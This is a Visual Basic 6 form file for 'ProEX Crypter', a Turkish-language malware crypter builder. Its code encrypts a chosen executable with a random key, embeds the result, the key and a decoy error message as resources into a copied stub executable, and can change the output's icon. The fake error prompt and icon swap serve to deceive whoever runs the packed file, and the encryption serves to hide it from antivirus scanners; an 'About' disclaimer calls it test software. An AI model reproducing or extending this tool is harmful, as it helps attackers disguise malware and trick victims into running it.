VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00404040&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "ProEX Crypter  By Harmmy"
   ClientHeight    =   6045
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   6030
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6045
   ScaleWidth      =   6030
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command6 
      Caption         =   "CRYPT!"
      Height          =   375
      Left            =   3600
      TabIndex        =   20
      Top             =   5520
      Width           =   1335
   End
   Begin VB.CommandButton Command5 
      Caption         =   "ABOUT"
      Height          =   375
      Left            =   1080
      TabIndex        =   19
      Top             =   5520
      Width           =   1335
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00404040&
      Height          =   1095
      Left            =   360
      TabIndex        =   14
      Top             =   4200
      Width           =   5295
      Begin VB.CommandButton Command4 
         Caption         =   "Browse"
         Enabled         =   0   'False
         Height          =   285
         Left            =   4200
         TabIndex        =   18
         Top             =   600
         Width           =   975
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   840
         TabIndex        =   17
         Top             =   600
         Width           =   3135
      End
      Begin VB.CheckBox Check2 
         BackColor       =   &H00404040&
         Caption         =   "Change Ico File"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "Ico:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   600
         Width           =   375
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00404040&
      Height          =   1695
      Left            =   360
      TabIndex        =   7
      Top             =   2400
      Width           =   5295
      Begin VB.CommandButton Command3 
         Caption         =   "TEST!"
         Enabled         =   0   'False
         Height          =   735
         Left            =   4080
         TabIndex        =   11
         Top             =   720
         Width           =   1095
      End
      Begin VB.TextBox Text4 
         Height          =   285
         Left            =   960
         TabIndex        =   10
         Top             =   1200
         Width           =   2895
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   960
         TabIndex        =   9
         Top             =   720
         Width           =   2895
      End
      Begin VB.CheckBox Check1 
         BackColor       =   &H00404040&
         Caption         =   "Fake Error Message?"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   360
         Width           =   2535
      End
      Begin VB.Label Label4 
         BackColor       =   &H00404040&
         Caption         =   "Message:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   1200
         Width           =   855
      End
      Begin VB.Label Label3 
         BackColor       =   &H00404040&
         Caption         =   "Caption:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   720
         Width           =   735
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00404040&
      Height          =   1335
      Left            =   360
      TabIndex        =   0
      Top             =   960
      Width           =   5295
      Begin VB.CommandButton Command2 
         Caption         =   "Generate"
         Height          =   285
         Left            =   4080
         TabIndex        =   6
         Top             =   840
         Width           =   1095
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Browse"
         Height          =   285
         Left            =   4080
         TabIndex        =   5
         Top             =   360
         Width           =   1095
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   720
         TabIndex        =   4
         Top             =   840
         Width           =   3135
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   720
         TabIndex        =   2
         Top             =   360
         Width           =   3135
      End
      Begin VB.Label Label2 
         BackColor       =   &H00404040&
         Caption         =   "Key:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   840
         Width           =   495
      End
      Begin VB.Label Label1 
         BackColor       =   &H00404040&
         Caption         =   "File:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   495
      End
   End
   Begin VB.Image Image1 
      Height          =   930
      Left            =   0
      Picture         =   "Form1.frx":0000
      Top             =   0
      Width           =   6000
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private sEncFile As String
Private sGenKey  As String
Private sIcoFile As String
Private sErrMsg  As String

Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

Private Sub Check1_Click()
    Command3.Enabled = CBool(Check1.Value)
End Sub

Private Sub Check2_Click()
    Command4.Enabled = CBool(Check2.Value)
End Sub

Private Sub Command1_Click()
    Dim CD As New clsDialog
    With CD
        .DialogTitle = "Þifrelenecek Dosyanýzý Seçin."
        .CancelError = False
        .Filter = "Tüm Dosyalar|*.*"
        .ShowOpen
        If Len(.FileName) <> 0 Then
            sEncFile = .FileName
        Else
            .FileName = Empty
            sEncFile = ""
            Exit Sub
        End If
        .FileName = Empty
    End With

    If Text2.Text = "" Then
        Call Command2_Click
    End If

    Text1.Text = sEncFile
    sGenKey = Text2.Text
    sEncFile = EncryptData(LoadFile(sEncFile), sGenKey)

End Sub

Function aaa()
     Dim i, y, bbbb
    For i = 1 To 25
        Randomize
        For y = 1 To 25
            bbbb = bbbb & Chr$(CLng((35 - 90) * Rnd + 90))
            DoEvents
        Next y

        If Not i = 25 Then bbbb = ""
        Sleep 25
        DoEvents
    Next i
    
    aaa = bbbb
End Function
Private Sub Command2_Click()

    Dim i, y
    For i = 1 To 25
        Randomize
        For y = 1 To 25
            Text2.Text = Text2.Text & Chr$(CLng((35 - 90) * Rnd + 90))
            DoEvents
        Next y

        If Not i = 25 Then Text2.Text = ""
        Sleep 25
        DoEvents
    Next i
End Sub

Private Sub Command3_Click()
    If Check1.Value = vbChecked Then
        MsgBox Text4.Text, vbCritical, Text3.Text
    Else
        MsgBox "Fake Message seçeneðini aktif ettikten sonra deneyin!"
    End If
End Sub

Private Sub Command4_Click()
    Dim CD As New clsDialog
    With CD
        .DialogTitle = "Ico Dosyasýný Seçin"
        .CancelError = False
        .Filter = "Tüm Dosyalar|*.*"
        .ShowOpen
        If Len(.FileName) <> 0 Then
            sIcoFile = .FileName
            Text5.Text = sIcoFile
        Else
            .FileName = Empty
            sIcoFile = ""
            Text5.Text = ""
            Exit Sub
        End If
        .FileName = Empty
    End With
End Sub

Private Sub Command5_Click()
 Call MsgBox("Program test amaçlý yazýlmýþ olup kötüye kullanýmýna baðlý olarak doðabilecek sorun/sorunlar'dan kullanýcý sorumludur." & vbNewLine & _
            "Coded By Harmmy!", vbInformation + vbOKOnly, "Hakkýnda")
            
Call MsgBox("Logo tasarýmýný yapan bourreau'ya teþekkür ederim.", vbInformation, "Bilgi")
End Sub

Private Sub Command6_Click()
    Dim CD As New clsDialog
    With CD
        .DialogTitle = "Kayýt edilecek yeri seçin."
        .CancelError = False
        .Filter = "Tüm Dosyalar|*.*"
        .ShowSave
    End With

    Dim swFilepath As String
    swFilepath = IIf(Right(CD.FileName, 4) = ".exe", CD.FileName, CD.FileName & ".exe")
    CopyFile App.Path & "\Stub.exe", swFilepath, 0

    Open App.Path & "\EncFile" For Binary As #1
        Put #1, , sEncFile
    Close #1

    Open App.Path & "\KeyFile" For Binary As #1
        Put #1, , sGenKey
    Close #1
    

    sErrMsg = IIf(Check1.Value = vbChecked, "oOo.--.oOo", aaa) & "////" & IIf(Text4.Text = "", aaa, Text4.Text) & "////" & IIf(Text3.Text = "", aaa, Text3.Text)
    Open App.Path & "\ErrMsg" For Binary As #1
        Put #1, , sErrMsg
    Close #1
    
    Call ResEkle(swFilepath, App.Path & "\EncFile", "CUSTOM", "DATA")
    Call ResEkle(swFilepath, App.Path & "\KeyFile", "CUSTOM", "KEYS")
    Call ResEkle(swFilepath, App.Path & "\ErrMsg", "CUSTOM", "ERRS")
    
    If Check2.Value = vbChecked Then
        Call IconDegistir(swFilepath, sIcoFile)
    End If
    Kill App.Path & "\EncFile"
    Kill App.Path & "\KeyFile"
    Kill App.Path & "\ErrMsg"
    
    Kill App.Path & "\tools\Reshacker.ini"
    Kill App.Path & "\tools\Reshacker.log"
    
    MsgBox "Tamamlandý!", vbInformation + vbOKOnly, "Bitti!"
End Sub

Private Sub Form_Load()
    Call FixThemeSupport(Me.Controls) 'add by theBatch 1.0
    Me.Caption = "ProEX Crypter v1.1 Harmmy!"
    Call Command5_Click
End Sub

